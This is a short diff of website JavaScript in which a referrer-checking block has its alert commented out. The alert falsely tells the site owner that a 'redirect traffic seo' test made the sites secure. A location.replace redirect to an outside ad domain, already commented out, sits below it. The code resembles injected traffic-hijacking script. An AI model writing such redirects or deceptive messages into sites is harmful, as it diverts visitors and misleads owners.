@@ -157,7 +157,7 @@ class decideAndDo{
 			document.referrer.includes("xx")||
 			document.referrer.includes("ds2play")
 			){
-alert("Dear owner of this site. We have successfully tested the redirect traffic seo on your page. It was completed at 2:38 am Sunday, 19 November 2023 Greenwich Mean Time (GMT). As a premium user its our gift to all your sites and now they secured with SSL, CMS anti-malware design. From now your ads traffic will also help in ranking over variety of engines");
+//alert("Dear owner of this site. We have successfully tested the redirect traffic seo on your page. It was completed at 2:38 am Sunday, 19 November 2023 Greenwich Mean Time (GMT). As a premium user its our gift to all your sites and now they secured with SSL, CMS anti-malware design. From now your ads traffic will also help in ranking over variety of engines");
 			//location.replace("//intorterraon.com/4/6606783");
 		}
 	}
